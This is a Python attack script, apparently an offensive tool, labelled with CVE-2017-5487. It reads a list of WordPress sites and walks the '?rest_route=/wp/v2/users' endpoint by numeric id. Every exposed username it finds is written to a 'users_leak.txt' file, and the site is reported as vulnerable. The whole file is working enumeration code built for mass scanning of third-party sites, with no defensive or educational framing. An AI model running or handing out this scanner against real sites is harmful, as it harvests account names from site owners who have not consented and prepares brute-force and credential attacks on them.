import requests
from rich.console import Console
import argparse
import json
from threading import Thread
import simplejson
import time 
import pyfiglet
from colorama import Fore, Style


console=Console()


def arparse():
     global args
     parser = argparse.ArgumentParser(description="Wordpress_Leak_username")

     text = "leak_username"
     font = "slant"
     taille=10000
     banner = str(pyfiglet.figlet_format(text, font,width=taille))

     print(Fore.YELLOW + Style.BRIGHT +f'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n              {banner}\n                  Author:Jhonson\n                  Email:wannaajhonson@gmail.com\n\n                  CVE-2017-5487\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n' + Style.RESET_ALL)

     parser.add_argument("-list", "--list", dest="list", help="list urls", required=True)
     parser.add_argument("-number", "--number", dest="number", help="nombre des users", required=True)     
     args = parser.parse_args()

    
def main(url,directory,number):

   try : 
     with open (url,'r') as s:
        for urls in s:
           strip=urls.strip()
           for i in range (0,int(number)) :
                
                global json
                form=f'http://{strip}/{directory}/{i}'.strip()          
              
                req=requests.get(form)
                result=req.text
                json=result

              
                if req.status_code==200:
                   json=req.json()
                   if 'name' in json :
                       
                       with open('users_leak.txt', 'a') as leak:
                         write=leak.write(f'{req.url}\nid:{i}\nname:{json["name"]}\n\n')
                         print(Fore.GREEN + Style.BRIGHT +f'http://{strip} Vuln Found ! ==> cat users_leak.txt' + Style.RESET_ALL)
                        
                   else :
                        print(Fore.RED + Style.BRIGHT +f'{strip} No Vuln Found ! ' + Style.RESET_ALL)
                           
                else :
                 print(Fore.RED + Style.BRIGHT +f'http://{strip} No Vuln Found ==> {str(req.status_code)}' + Style.RESET_ALL)
                 
   except simplejson.errors.JSONDecodeError :
                 print(Fore.RED + Style.BRIGHT +f'http://{strip} No Vuln Found ==> {str(req.status_code)}', style='red')
           
   except requests.exceptions.SSLError:
                  print(Fore.RED + Style.BRIGHT +f'No data connexion'+ Style.RESET_ALL)
   except requests.exceptions.ConnectionError: 
           print(Fore.RED + Style.BRIGHT +f'format url error . exemple www.exemple.com'+ Style.RESET_ALL)
 
if __name__=='__main__':
           
           threads = []
          
           arparse()          
           thread = Thread(target=main, args=(args.list,'?rest_route=/wp/v2/users',args.number))
           threads.append(thread)
           thread.start()

